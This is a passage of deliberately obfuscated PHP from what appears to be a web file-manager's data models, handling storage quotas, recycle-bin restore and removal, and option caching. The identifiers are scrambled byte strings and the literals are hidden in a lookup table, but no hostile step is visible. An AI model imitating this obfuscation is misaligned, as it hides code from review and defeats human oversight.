$÷Ä¤ş[$¾¤[2044]]) { continue; } $Ë™‹î¦[] = array($¾¤[397], $÷Ä¤ş[$¾¤[397]], $¾¤[78], $÷Ä¤ş[$¾¤[78]]); } $this->saveAll($Ë™‹î¦); } public function userSpaceReset($¶ •Óµ÷šÍ = false) { $Õ·™çà‚Óß =& $_SERVER[èÍ×öˆøÉ]; $Ú®ÄÂ = $this->where(array($Õ·™çà‚Óß[406] => self::TYPE_USER, $Õ·™çà‚Óß[498] => $¶ •Óµ÷šÍ, $Õ·™çà‚Óß[405] => 0))->sum($Õ·™çà‚Óß[78]); $Ú®ÄÂ = !$Ú®ÄÂ || $Ú®ÄÂ <= 0 ? 0 : $Ú®ÄÂ; Model($Õ·™çà‚Óß[507])->userEdit($¶ •Óµ÷šÍ, array($Õ·™çà‚Óß[1737] => $Ú®ÄÂ)); } public function targetSpaceUpdate($¶é¼’, $±ºêí¯¨) { $ÎÉéìüÍê„ÓÎ =& $_SERVER[èÍ×öˆøÉ]; if (!$±ºêí¯¨) { return; } if (!in_array($¶é¼’, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $éÖ·…ôĞÛ  = $this->targetSpaceSize($¶é¼’, $±ºêí¯¨); if ($¶é¼’ == self::TYPE_USER) { Model($ÎÉéìüÍê„ÓÎ[507])->userEdit($±ºêí¯¨, array($ÎÉéìüÍê„ÓÎ[1737] => $éÖ·…ôĞÛ )); } else { if ($¶é¼’ == self::TYPE_GROUP) { Model($ÎÉéìüÍê„ÓÎ[516])->groupEdit($±ºêí¯¨, array($ÎÉéìüÍê„ÓÎ[1737] => $éÖ·…ôĞÛ )); } } } public function targetSpaceSize($åŠ·¼É¦Ï©, $‘»¿Ô) { $˜ÍÃşş­Îş =& $_SERVER[èÍ×öˆøÉ]; $Âïø¡¹ßçÖº = $this->sourceRoot($åŠ·¼É¦Ï©, $‘»¿Ô, !0); if (!$Âïø¡¹ßçÖº) { return 0; } $àÓµ£µÛıŒ² = floatval($Âïø¡¹ßçÖº[$˜ÍÃşş­Îş[78]]); $ÍßĞ™­ = array($˜ÍÃşş­Îş[578] => array($˜ÍÃşş­Îş[538], $˜ÍÃşş­Îş[525] . $Âïø¡¹ßçÖº[$˜ÍÃşş­Îş[397]] . $˜ÍÃşş­Îş[539])); $Å¨¸­® = Model($˜ÍÃşş­Îş[423])->field($˜ÍÃşş­Îş[412])->where($ÍßĞ™­)->select(); $Å¨¸­® = array_to_keyvalue($Å¨¸­®, $˜ÍÃşş­Îş[33], $˜ÍÃşş­Îş[397]); $Å¨¸­® = array_unique(array_filter($Å¨¸­®)); if ($Å¨¸­®) { $ÍßĞ™­ = array($˜ÍÃşş­Îş[412] => array($˜ÍÃşş­Îş[413], $Å¨¸­®)); $àÓµ£µÛıŒ² += floatval($this->where($ÍßĞ™­)->sum($˜ÍÃşş­Îş[78])); } $àÓµ£µÛıŒ² = !$àÓµ£µÛıŒ² || $àÓµ£µÛıŒ² <= 0 ? 0 : $àÓµ£µÛıŒ²; return $àÓµ£µÛıŒ²; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($–Üôîİ) { return $this->fileTypeProfile($–Üôîİ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Ô½Àœñµ£ş) { return $this->fileTypeProfile($Ô½Àœñµ£ş, SourceModel::TYPE_GROUP); } private function fileTypeProfile($“ìì•íåÂ, $¼À›Ë€) { $ĞØ”©ÁÉ =& $_SERVER[èÍ×öˆøÉ]; $€¬§ĞÉ² = $ĞØ”©ÁÉ[2045] . $“ìì•íåÂ . $ĞØ”©ÁÉ[71] . $¼À›Ë€; $èœ˜ = Cache::get($€¬§ĞÉ²); if ($èœ˜) { return $èœ˜; } $Ìù = array($ĞØ”©ÁÉ[571] => 0); if ($“ìì•íåÂ != !1) { $Ìù[$ĞØ”©ÁÉ[498]] = $“ìì•íåÂ; $Ìù[$ĞØ”©ÁÉ[406]] = $¼À›Ë€; } $èÉ€×äï˜ = array(); $èÉ€×äï˜[$ĞØ”©ÁÉ[2046]] = array($ĞØ”©ÁÉ[2047] => LNG($ĞØ”©ÁÉ[2046]), $ĞØ”©ÁÉ[2048] => $this->where($Ìù)->count(), $ĞØ”©ÁÉ[573] => $this->where($Ìù)->sum($ĞØ”©ÁÉ[78])); $À·ßşŠ = KodIO::fileTypeList(); foreach ($À·ßşŠ as $Ó€îö => $ç) { $Ìù[$ĞØ”©ÁÉ[407]] = $this->fileTypeWhere($Ó€îö); $èÉ€×äï˜[$Ó€îö] = array($ĞØ”©ÁÉ[2047] => $ç[$ĞØ”©ÁÉ[28]], $ĞØ”©ÁÉ[2048] => $this->where($Ìù)->count(), $ĞØ”©ÁÉ[573] => $this->where($Ìù)->sum($ĞØ”©ÁÉ[78])); } Cache::set($€¬§ĞÉ², $èÉ€×äï˜, 1200); return $èÉ€×äï˜; } public function fileNameExist($ªØ¸â, $¿Ê) { $ÓƒÎ‚È¸á³¶ =& $_SERVER[èÍ×öˆøÉ]; $æÀ = $this->where(array($ÓƒÎ‚È¸á³¶[492] => $ªØ¸â, $ÓƒÎ‚È¸á³¶[28] => $¿Ê, $ÓƒÎ‚È¸á³¶[425] => 0))->find(); return is_array($æÀ) ? $æÀ[$ÓƒÎ‚È¸á³¶[397]] : !1; } public function childList($ÆĞã”™Òè¸¾) { $ûçÒéÚ =& $_SERVER[èÍ×öˆøÉ]; $®ëÊĞ±“˜ = $ûçÒéÚ[2023] . $ÆĞã”™Òè¸¾; if (isset(self::$cacheChildList[$®ëÊĞ±“˜])) { return self::$cacheChildList[$®ëÊĞ±“˜]; } $ƒá = array($ûçÒéÚ[492] => intval($ÆĞã”™Òè¸¾), $ûçÒéÚ[425] => 0); $ˆÆ = $this->where($ƒá)->select(); $ˆÆ = $ˆÆ ? $ˆÆ : array(); self::$cacheChildList[$®ëÊĞ±“˜] = $ˆÆ; foreach ($ˆÆ as $ˆÁ) { $®ëÊĞ±“˜ = $ûçÒéÚ[452] . $ˆÁ[$ûçÒéÚ[397]]; self::$cacheSourceInfo[$®ëÊĞ±“˜] = $ˆÁ; } return $ˆÆ; } public function fileNameAuto($Şò¦ÃŸ, $£öÒ´¤, $ªâ¯¼‡ÆĞ¼ = REPEAT_RENAME, $¦ = false) { $ÇÑĞà—êõì =& $_SERVER[èÍ×öˆøÉ]; $•ã‡Ùˆ‘§ = array($ÇÑĞà—êõì[492] => $Şò¦ÃŸ, $ÇÑĞà—êõì[425] => 0, $ÇÑĞà—êõì[28] => array($ÇÑĞà—êõì[381], $£öÒ´¤ . $ÇÑĞà—êõì[382])); $äÙ¯›…ù = $this->field($ÇÑĞà—êõì[28])->where($•ã‡Ùˆ‘§)->select(); $¯£”ã = array_to_keyvalue($äÙ¯›…ù, $ÇÑĞà—êõì[33], $ÇÑĞà—êõì[28]); return $this->fileNameAutoGet($¯£”ã, $£öÒ´¤, $ªâ¯¼‡ÆĞ¼, $¦); } public function fileNameAutoGet($¤Ş¬Ú¤ŠË¯öî, $á¡¬¹İÖ³‹È, $áĞê–ÍäĞ, $€½‡ŒêÙ) { $İÕâÁÊ©ôø¦ =& $_SERVER[èÍ×öˆøÉ]; if ($áĞê–ÍäĞ == REPEAT_REPLACE || !$¤Ş¬Ú¤ŠË¯öî || !in_array_not_case($á¡¬¹İÖ³‹È, $¤Ş¬Ú¤ŠË¯öî) || $€½‡ŒêÙ && $áĞê–ÍäĞ != REPEAT_RENAME_FOLDER) { return $á¡¬¹İÖ³‹È; } if ($áĞê–ÍäĞ == REPEAT_SKIP) { return !1; } $çÔşÄ = $İÕâÁÊ©ôø¦[95] . get_path_ext($á¡¬¹İÖ³‹È); $çÔşÄ = $çÔşÄ == $İÕâÁÊ©ôø¦[95] || $€½‡ŒêÙ ? $İÕâÁÊ©ôø¦[33] : $çÔşÄ; for ($‡ = 1; $‡ <= count($¤Ş¬Ú¤ŠË¯öî) + 1; $‡++) { $ŠŸ = substr($á¡¬¹İÖ³‹È, 0, strlen($á¡¬¹İÖ³‹È) - strlen($çÔşÄ)); $Õ¦Úå–Èñ = $ŠŸ . "\50{$‡}\x29{$çÔşÄ}"; if (!in_array_not_case($Õ¦Úå–Èñ, $¤Ş¬Ú¤ŠË¯öî)) { return $Õ¦Úå–Èñ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\x75\162\143\145\x5f\162\x65\143\x79\143\x6c\x65"; protected $dataAuto = array(array("\x63\162\x65\141\x74\x65\124\151\x6d\x65", "\164\x69\155\145", "\151\156\x73\145\x72\x74", "\146\165\x6e\x63\x74\151\x6f\x6e")); public function listData($¦´…óÇÚ = false) { $ª¥„€– =& $_SERVER[èÍ×öˆøÉ]; $¦´…óÇÚ = $¦´…óÇÚ ? $¦´…óÇÚ : USER_ID; $¨ ¬Ûšş = $this->where(array($ª¥„€–[1573] => $¦´…óÇÚ))->select(); return array_to_keyvalue($¨ ¬Ûšş, $ª¥„€–[33], $ª¥„€–[397]); } public function moveToRecycle($·û„) { $Ê“á„©Ğ€ğ =& $_SERVER[èÍ×öˆøÉ]; $¹±‡ËÏİ× = Model($Ê“á„©Ğ€ğ[1256]); $˜ºÍˆÇ = $¹±‡ËÏİ×->sourceInfo($·û„); if (!$˜ºÍˆÇ || $˜ºÍˆÇ[$Ê“á„©Ğ€ğ[425]] == $Ê“á„©Ğ€ğ[87]) { return; } $¹Ş±ÚÌ = array($Ê“á„©Ğ€ğ[412] => $·û„, $Ê“á„©Ğ€ğ[1573] => USER_ID, $Ê“á„©Ğ€ğ[574] => $˜ºÍˆÇ[$Ê“á„©Ğ€ğ[406]], $Ê“á„©Ğ€ğ[575] => $˜ºÍˆÇ[$Ê“á„©Ğ€ğ[498]], $Ê“á„©Ğ€ğ[578] => $˜ºÍˆÇ[$Ê“á„©Ğ€ğ[515]]); $this->add($¹Ş±ÚÌ); $this->recycleMove($·û„, 1); if ($˜ºÍˆÇ[$Ê“á„©Ğ€ğ[405]] == $Ê“á„©Ğ€ğ[87]) { $¾š = array($Ê“á„©Ğ€ğ[578] => array($Ê“á„©Ğ€ğ[538], $˜ºÍˆÇ[$Ê“á„©Ğ€ğ[515]] . $·û„ . $Ê“á„©Ğ€ğ[539])); $¹±‡ËÏİ×->where($¾š)->setField($Ê“á„©Ğ€ğ[425], 1); } } public function clear() { $this->remove(!1); } public function remove($°õê¹İİó÷ë = false, $‘³õ‰î = false) { $úöÔäÂ© =& $_SERVER[èÍ×öˆøÉ]; $‘³õ‰î = $‘³õ‰î ? $‘³õ‰î : USER_ID; $›‡…‰ø = Model($úöÔäÂ©[1256]); $ğ½¨š“ñêÍÓ = $this->listData($‘³õ‰î); $°õê¹İİó÷ë = $°õê¹İİó÷ë === !1 ? !1 : $°õê¹İİó÷ë; $ï—¢ = array(); foreach ($ğ½¨š“ñêÍÓ as $ÒëÄÆ×´) { if ($°õê¹İİó÷ë != !1 && !in_array($ÒëÄÆ×´, $°õê¹İİó÷ë)) { continue; } $ÃÃô = $›‡…‰ø->sourceInfo($ÒëÄÆ×´); $›‡…‰ø->remove($ÒëÄÆ×´, !1); $¡ºÌ = $ÃÃô[$úöÔäÂ©[406]] . $úöÔäÂ©[71] . $ÃÃô[$úöÔäÂ©[498]]; $ï—¢[$¡ºÌ] = array($úöÔäÂ©[574] => $ÃÃô[$úöÔäÂ©[406]], $úöÔäÂ©[498] => $ÃÃô[$úöÔäÂ©[498]]); $this->where(array($úöÔäÂ©[397] => $ÒëÄÆ×´))->delete(); } foreach ($ï—¢ as $¬»ñ¡ƒ) { $›‡…‰ø->targetSpaceUpdate($¬»ñ¡ƒ[$úöÔäÂ©[406]], $¬»ñ¡ƒ[$úöÔäÂ©[498]]); } } public function restore($ï›…ÓŞ = false) { $º„šÑ°ì¸ = $this->listData(); $this->_restoreSource($º„šÑ°ì¸, $ï›…ÓŞ); } public function removeUserAll($¢¶¢‰©) { $this->remove(!1, $¢¶¢‰©); } private function _restoreSource($¯üè, $úü‘ºĞø‚ŸÃ) { $Ü¬ÂºÈŠ =& $_SERVER[èÍ×öˆøÉ]; $ÄÊ = Model($Ü¬ÂºÈŠ[1256]); $úü‘ºĞø‚ŸÃ = $úü‘ºĞø‚ŸÃ == !1 ? !1 : $úü‘ºĞø‚ŸÃ; if (!$¯üè) { return !0; } $èº¶‹ = array(); foreach ($¯üè as $ê·¯›Ø¬è) { if ($úü‘ºĞø‚ŸÃ != !1 && !in_array($ê·¯›Ø¬è, $úü‘ºĞø‚ŸÃ)) { continue; } $Á¥Ì = $ÄÊ->sourceInfo($ê·¯›Ø¬è); $õµÙû÷ = $ÄÊ->sourceInfo($Á¥Ì[$Ü¬ÂºÈŠ[492]]); if ($õµÙû÷[$Ü¬ÂºÈŠ[425]] == $Ü¬ÂºÈŠ[87]) { continue; } $ÄÊ->lockMoveStart($ê·¯›Ø¬è); $this->recycleMove($ê·¯›Ø¬è, 0); if ($Á¥Ì[$Ü¬ÂºÈŠ[405]] == $Ü¬ÂºÈŠ[87]) { $ëÌÄ¨·Õ = array($Ü¬ÂºÈŠ[578] => array($Ü¬ÂºÈŠ[538], $Á¥Ì[$Ü¬ÂºÈŠ[515]] . $ê·¯›Ø¬è . $Ü¬ÂºÈŠ[539])); $ÄÊ->where($ëÌÄ¨·Õ)->setField($Ü¬ÂºÈŠ[425], 0); $this->restoreFolderChildren($ê·¯›Ø¬è, $¯üè); } $this->where(array($Ü¬ÂºÈŠ[397] => $ê·¯›Ø¬è))->delete(); $ÄÊ->folderSizeReset($Á¥Ì[$Ü¬ÂºÈŠ[492]]); $èº¶‹[] = $Á¥Ì[$Ü¬ÂºÈŠ[492]]; if ($Á¥Ì[$Ü¬ÂºÈŠ[405]] == $Ü¬ÂºÈŠ[87]) { $èº¶‹[] = $ê·¯›Ø¬è; } $ÄÊ->lockMoveEnd($ê·¯›Ø¬è); } $ÄÊ->updateModifyTime($èº¶‹); } private function restoreFolderChildren($Îâ, $—×ÁÏé) { $à½Ê–õŠ” =& $_SERVER[èÍ×öˆøÉ]; $¢È´‚Á¼ı™ª = Model($à½Ê–õŠ”[1256]); $Ñş¾à€¼÷ = array($à½Ê–õŠ”[397] => array($à½Ê–õŠ”[7], array())); foreach ($—×ÁÏé as $–ĞÃäòØÙÙ) { if ($–ĞÃäòØÙÙ == $Îâ) { continue; } if (!$¢È´‚Á¼ı™ª->isParentOf($Îâ, $–ĞÃäòØÙÙ)) { continue; } $ÉÄªÇêß‡Òƒ§ = $¢È´‚Á¼ı™ª->sourceInfo($–ĞÃäòØÙÙ); if ($ÉÄªÇêß‡Òƒ§[$à½Ê–õŠ”[405]] == $à½Ê–õŠ”[87]) { $Ñş¾à€¼÷[] = array($à½Ê–õŠ”[578] => array($à½Ê–õŠ”[538], $ÉÄªÇêß‡Òƒ§[$à½Ê–õŠ”[515]] . $–ĞÃäòØÙÙ . $à½Ê–õŠ”[539])); } else { $Ñş¾à€¼÷[$à½Ê–õŠ”[397]][1][] = $–ĞÃäòØÙÙ; } } if (!$Ñş¾à€¼÷[$à½Ê–õŠ”[397]][1]) { unset($Ñş¾à€¼÷[$à½Ê–õŠ”[397]]); } if (!$Ñş¾à€¼÷) { return; } $Ñş¾à€¼÷[$à½Ê–õŠ”[397]][1] = array_unique($Ñş¾à€¼÷[$à½Ê–õŠ”[397]][1]); $Ñş¾à€¼÷[$à½Ê–õŠ”[997]] = $à½Ê–õŠ”[1844]; $¢È´‚Á¼ı™ª->where($Ñş¾à€¼÷)->setField($à½Ê–õŠ”[425], 1); } private function recycleMove($ÏË¨, $èÊ = 1) { $€óÎ¿ =& $_SERVER[èÍ×öˆøÉ]; $¯È¯Ó›… = Model($€óÎ¿[1256]); $´æ— = Model($€óÎ¿[2049]); $ûİ§ €ñÔ¤ = array($€óÎ¿[397] => $ÏË¨); if ($èÊ) { $¯È¯Ó›…->where($ûİ§ €ñÔ¤)->setField($€óÎ¿[425], 1); $´æ—->eventRecycle($ÏË¨, $€óÎ¿[2050]); } else { $ô¼ä°•Û£ = $¯È¯Ó›…->where($ûİ§ €ñÔ¤)->find(); $˜Í = $ô¼ä°•Û£[$€óÎ¿[405]] == $€óÎ¿[87]; $óÅÒ = $¯È¯Ó›…->fileNameAuto($ô¼ä°•Û£[$€óÎ¿[492]], $ô¼ä°•Û£[$€óÎ¿[28]], REPEAT_RENAME_FOLDER, $˜Í); if ($óÅÒ != $ô¼ä°•Û£[$€óÎ¿[28]]) { $¯È¯Ó›…->rename($ÏË¨, $óÅÒ); } $¯È¯Ó›…->where($ûİ§ €ñÔ¤)->setField($€óÎ¿[425], 0); $´æ—->eventRecycle($ÏË¨, $€óÎ¿[2051]); } } } goto A†ÚƒÀ §¬; E×ëÑšèº: define($_SERVER[èÍ×öˆøÉ][239], 1); define($_SERVER[èÍ×öˆøÉ][240], 0); define($_SERVER[èÍ×öˆøÉ][241], 2); goto CÃÊ‡è±Ü“; CğÄÛÆ¢³£: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Ó° = false, $ê¯‚¾ŸËá = '', $£¬Ñçš¹‹î = false) { $ÁëÙØ =& $_SERVER[èÍ×öˆøÉ]; $Õİì = $this->cacheGet($ê¯‚¾ŸËá); $üâõªÌ–Ñ˜ß = $this->optionDefault($ê¯‚¾ŸËá); $üâõªÌ–Ñ˜ß = is_array($üâõªÌ–Ñ˜ß) ? $üâõªÌ–Ñ˜ß : array(); if (is_array($Õİì)) { $Õİì = array_merge($üâõªÌ–Ñ˜ß, $Õİì); return $Ó° ? isset($Õİì[$Ó°]) ? $Õİì[$Ó°] : null : $Õİì; } $“ƒ = $this->filterWhere(array($ÁëÙØ[29] => $ê¯‚¾ŸËá)); $Õİì = $this->where($“ƒ)->select(); $Õİì = array_to_keyvalue($Õİì, $ÁëÙØ[93], $ÁëÙØ[372]); foreach ($Õİì as $ÆüµãéœÎí => $—Î–¼º¶) { if ($£¬Ñçš¹‹î || in_array($ÆüµãéœÎí, $this->jsonField)) { $Õİì[$ÆüµãéœÎí] = json_decode($—Î–¼º¶, !0); } } $this->cacheSet($ê¯‚¾ŸËá, $Õİì); $Õİì = array_merge($üâõªÌ–Ñ˜ß, $Õİì); return $Ó° ? $Õİì[$Ó°] : $Õİì; } public function set($Ä–ßå±¢Ë±, $Ó‘Äïµ€ = false, $Ù€šŸÏµ = '') { $Ñ·äßê³Å“ =& $_SERVER[èÍ×öˆøÉ]; $this->cacheRemove($Ù€šŸÏµ); $§»¨Ê¿À = array(); $›Ö¬ = is_array($Ä–ßå±¢Ë±) ? $Ä–ßå±¢Ë± : array($Ä–ßå±¢Ë± => $Ó‘Äïµ€); foreach ($›Ö¬ as $¤ûûÀ => $¯Ê—§ë¤Ñ÷è) { if (is_array($¯Ê—§ë¤Ñ÷è)) { $¯Ê—§ë¤Ñ÷è = json_encode_force($¯Ê—§ë¤Ñ÷è); } $this->checkLength($¯Ê—§ë¤Ñ÷è, !1, $this->tableName . $Ñ·äßê³Å“[4] . $Ä–ßå±¢Ë±); $¯Ê—§ë¤Ñ÷è = self::textEncode($¯Ê—§ë¤Ñ÷è); $›Ö¬ = array($Ñ·äßê³Å“[29] => $Ù€šŸÏµ, $Ñ·äßê³Å“[93] => $¤ûûÀ, $Ñ·äßê³Å“[372] => $¯Ê—§ë¤Ñ÷è); $§»¨Ê¿À[] = $this->filterWhere($›Ö¬); } if (!$§»¨Ê¿À) { return !0; } return $this->addAll($§»¨Ê¿À, array(), !0); } protected function optionDefault($¼àÉ = '') { return !1; } public function setDeep($½¶À¥¶ß§™, $‹¥Ş = false, $²Î½ÉŸšú = '') { $Ë = explode($_SERVER[èÍ×öˆøÉ][95], $½¶À¥¶ß§™); $İ™ œâ¿Ì = $this->get(); array_set_value($İ™ œâ¿Ì, $½¶À¥¶ß§™, $‹¥Ş); $this->set($Ë[0], $İ™ œâ¿Ì[$Ë[0]], $²Î½ÉŸšú); } public function remove($ì, $ì¨¹–šÍ°ü = '') { $÷©öÎ =& $_SERVER[èÍ×öˆøÉ]; $this->cacheRemove($ì¨¹–šÍ°ü); $˜ÆÌØ = $this->filterWhere(array($÷©öÎ[93] => $ì, $÷©öÎ[29] => $ì¨¹–šÍ°ü)); if (is_null($ì)) { unset($˜ÆÌØ[$÷©öÎ[93]]); } return $this->where($˜ÆÌØ)->delete(); } public function cacheSet($×ƒ”Í›¼, $Ú¼ÜºÖÖ‚ = false) { return Cache::set($this->cacheKey($×ƒ”Í›¼), $Ú¼ÜºÖÖ‚); } public function cacheGet($¹ÄÎ× ı’) { return Cache::get($this->cacheKey($¹ÄÎ× ı’)); } public function cacheRemove($æ×úàš) { return Cache::remove($this->cacheKey($æ×úàš)); } protected function filterWhere($õÄç”íïë‚) { return $õÄç”íïë‚; } protected function cacheKey($¥Ëå) { return $¥Ëå; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\165\162\143\x65"; protected $tableMeta = array("\x74\x61\142\x6c\145\x4e\141\155\145" => "\151\157\137\x73\x6f\x75\x72\x63\x65\137\x6d\145\164\141", "\x6d\145\x74\x61\106\151\x65\x6c\x64" => "\x73\157\x75\x72\143\x65\x49\104"); protected $dataAuto = array(array("\155\157\x64\151\x66\171\124\151\155\145", "\164\151\x6d\x65", "\151\156\x73\145\x72\164", "\146\x75\x6e\x63\164\151\x6f\156"), array("\x63\162\145\x61\164\x65\x54\151\155\145", "\164\x69\x6d\145", "\151\x6e\163\x65\162\x74", "\146\x75\x6e\x63\x74\x69\x6f\156"), array("\x76\x69\145\x77\x54\151\x6d\145", "\x74\151\155\x65", "\151\x6e\x73\145\162\164", "\146\x75\156\143\164\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ñÔµ«†© ’ñ) { return $this->listSource(array($_SERVER[èÍ×öˆøÉ][396] => $ñÔµ«†© ’ñ)); } public function typeName($…°) { static $ß³“Õ†«Ì‘ = array(self::TYPE_SYSTEM => "\163\x79\163\164\x65\x6d", self::TYPE_USER => "\x75\163\x65\162", self::TYPE_GROUP => "\147\x72\157\165\160"); return $ß³“Õ†«Ì‘[$…° . $_SERVER[èÍ×öˆøÉ][33]]; } public function sourceListInfo($Üå¹„Ï, $»‡¸˜í = false) { $Ò¤×Œ =& $_SERVER[èÍ×öˆøÉ]; $Üå¹„Ï = $Üå¹„Ï ? $Üå¹„Ï : array(); $Üå¹„Ï = array_filter(array_unique($Üå¹„Ï)); if (!$Üå¹„Ï) { return array(); } $¿Ğ™ÅŸ¾Ğ = $this->where(array($Ò¤×Œ[397] => array($Ò¤×Œ[7], $Üå¹„Ï)))->select(); $this->_listDataApply($¿Ğ™ÅŸ¾Ğ, $»‡¸˜í); return array_to_keyvalue($¿Ğ™ÅŸ¾Ğ, $Ò¤×Œ[397]); } public function pathInfoFilter(&$ø…ã÷šÆüÈè) { $ÂÄ°“Ğ–« =& $_SERVER[èÍ×öˆøÉ]; static $ĞÆøÃê°àšÊò = false; static $Á– = false; static $ = false; if (!$ĞÆøÃê°àšÊò) { $â¡¡œš = $ÂÄ°“Ğ–«[398]; $â¡¡œš .= $ÂÄ°“Ğ–«[399]; $â¡¡œš .= $ÂÄ°“Ğ–«[400]; $ÈíîÑ = $ÂÄ°“Ğ–«[401]; $ Û›ğÏº = explode($ÂÄ°“Ğ–«[47], $ÈíîÑ); $ĞÆøÃê°àšÊò = explode($ÂÄ°“Ğ–«[47], $â¡¡œš); $Á– = array(); foreach ($ĞÆøÃê°àšÊò as $’éÏØÃğ¦Ô) { if (in_array($’éÏØÃğ¦Ô, $ Û›ğÏº)) { continue; } $Á–[] = $’éÏØÃğ¦Ô; } $ = explode($ÂÄ°“Ğ–«[47], $ÂÄ°“Ğ–«[402]); } foreach ($ as $ıŒÓÑ²·›¸Á) { if (isset($ø…ã÷šÆüÈè[$ıŒÓÑ²·›¸Á])) { $ø…ã÷šÆüÈè[$ıŒÓÑ²·›¸Á] = intval($ø…ã÷šÆüÈè[$ıŒÓÑ²·›¸Á]); } } $ø…ã÷šÆüÈè[$ÂÄ°“Ğ–«[76]] = $ÂÄ°“Ğ–«[403] . $ø…ã÷šÆüÈè[$ÂÄ°“Ğ–«[397]] . $ÂÄ°“Ğ–«[404]; $ø…ã÷šÆüÈè[$ÂÄ°“Ğ–«[29]] = $ø…ã÷šÆüÈè[$ÂÄ°“Ğ–«[405]] == 1 ? $ÂÄ°“Ğ–«[77] : $ÂÄ°“Ğ–«[193]; $ø…ã÷šÆüÈè[$ÂÄ°“Ğ–«[406]] = $this->typeName($ø…ã÷šÆüÈè[$ÂÄ°“Ğ–«[406]]); if ($ø…ã÷šÆüÈè[$ÂÄ°“Ğ–«[405]] != 1) { $ø…ã÷šÆüÈè[$ÂÄ°“Ğ–«[168]] = $ø…ã÷šÆüÈè[$ÂÄ°“Ğ–«[407]]; unset($ø…ã÷šÆüÈè[$ÂÄ°“Ğ–«[407]]); } $ó‰ùæ = $ĞÆøÃê°àšÊò; if (isset($ø…ã÷šÆüÈè[$ÂÄ°“Ğ–«[408]]) && $ø…ã÷šÆüÈè[$ÂÄ°“Ğ–«[408]][$ÂÄ°“Ğ–«[409]] == -1) { $ó‰ùæ = $Á–; } $ø…ã÷šÆüÈè = array_field_key($ø…ã÷šÆüÈè, $ó‰ùæ); return $ø…ã÷šÆüÈè; } public function listUserFav() { $£³••µÈñ =& $_SERVER[èÍ×öˆøÉ]; $Ë®æÄ°û = Model($£³••µÈñ[410])->listData(); $˜ = array_filter_by_field($Ë®æÄ°û, $£³••µÈñ[29], $£³••µÈñ[411]); $˜ = array_to_keyvalue($˜, $£³••µÈñ[33], $£³••µÈñ[76]); if ($˜) { $ßõˆå = $this->listSource(array($£³••µÈñ[412] => array($£³••µÈñ[413], $˜))); } $ßõˆå = array_to_keyvalue($ßõˆå[$£³••µÈñ[367]], $£³••µÈñ[397]); foreach ($Ë®æÄ°û as &$) { $ = array($£³••µÈñ[414] => $[$£³••µÈñ[395]], $£³••µÈñ[415] => $[$£³••µÈñ[28]], $£³••µÈñ[416] => $[$£³••µÈñ[76]], $£³••µÈñ[417] => $[$£³••µÈñ[29]], $£³••µÈñ[418] => $[$£³••µÈñ[194]], $£³••µÈñ[419] => $[$£³••µÈñ[84]]); if ($[$£³••µÈñ[29]] == $£³••µÈñ[411] && $ßõˆå[$[$£³••µÈñ[76]]]) { $[$£³••µÈñ[85]] = $ßõˆå[$[$£³••µÈñ[76]]]; } } unset($); return $Ë®æÄ°û; } public function listUserTag($ò†“È˜Ğ¦ş) { $ô¬Ü«ˆÔ =& $_SERVER[èÍ×öˆøÉ]; if ($ò†“È˜Ğ¦ş && !is_array($ò†“È˜Ğ¦ş)) { $ò†“È˜Ğ¦ş = array($ò†“È˜Ğ¦ş); } $®ñ†ùŞÙª‚ = Model($ô¬Ü«ˆÔ[420])->listData(); $ûÓ—ÚøîÇ = array(); foreach ($®ñ†ùŞÙª‚ as $°°Œµí‰«ğ•¼) { $Ì = $°°Œµí‰«ğ•¼[$ô¬Ü«ˆÔ[76]]; if (!$Ì) { continue; } if (!isset($ûÓ—ÚøîÇ[$Ì])) { $ûÓ—ÚøîÇ[$Ì] = array(); } $ûÓ—ÚøîÇ[$Ì][] = $°°Œµí‰«ğ•¼[$ô¬Ü«ˆÔ[421]]; } $è¥Ø÷Â = array(); foreach ($ûÓ—ÚøîÇ as $é”ó˜À–—ø => $ş) { $Ç£¡– = !0; if (!$ò†“È˜Ğ¦ş) { $è¥Ø÷Â[] = $é”ó˜À–—ø; continue; } foreach ($ò†“È˜Ğ¦ş as $¡à£æ˜ÜÍší) { if (!in_array($¡à£æ˜ÜÍší, $ş)) { $Ç£¡– = !1; break; } } if ($Ç£¡–) { $è¥Ø÷Â[] = $é”ó˜À–—ø; } } if (!$è¥Ø÷Â) { return array(); } $Â÷¢´§µçÓª = $this->listSource(array($ô¬Ü«ˆÔ[412] => array($ô¬Ü«ˆÔ[413], $è¥Ø÷Â))); if (!$Â÷¢´§µçÓª || count($è¥Ø÷Â) == $Â÷¢´§µçÓª[$ô¬Ü«ˆÔ[364]][$ô¬Ü«ˆÔ[365]]) { return $Â÷¢´§µçÓª; } $öà“ = array(); $¨Êİ«û = array_to_keyvalue($Â÷¢´§µçÓª[$ô¬Ü«ˆÔ[75]], $ô¬Ü«ˆÔ[33], $ô¬Ü«ˆÔ[397]); $îÆ´— = array_to_keyvalue($Â÷¢´§µçÓª[$ô¬Ü«ˆÔ[74]], $ô¬Ü«ˆÔ[33], $ô¬Ü«ˆÔ[397]); $¿ë = array_merge($îÆ´—, $¨Êİ«û); foreach ($è¥Ø÷Â as $Ì) { if (!in_array($Ì, $¿ë)) { $öà“[] = $Ì; } } if ($öà“) { Model($ô¬Ü«ˆÔ[422])->removeBySource($öà“); } return $Â÷¢´§µçÓª; } public function listUserRecycle() { $ìÉú÷‹å =& $_SERVER[èÍ×öˆøÉ]; $ÃÑŠüŠØÊò = Model($ìÉú÷‹å[423])->listData(); if (!$ÃÑŠüŠØÊò) { return array(); } $Ãƒ¨Òª¤Ù­ = array($ìÉú÷‹å[412] => array($ìÉú÷‹å[413], $ÃÑŠüŠØÊò), $ìÉú÷‹å[424] => 1); return $this->listSource($Ãƒ¨Òª¤Ù­); } public function listSource($“İÇå‚, $¸¸å­Ò© = 3000) { $©²Â‚²ƒ” =& $_SERVER[èÍ×öˆøÉ]; if (!isset($“İÇå‚[$©²Â‚²ƒ”[425]])) { $“İÇå‚[$©²Â‚²ƒ”[425]] = 0; } $Âì = $©²Â‚²ƒ”[426]; $¤œ = 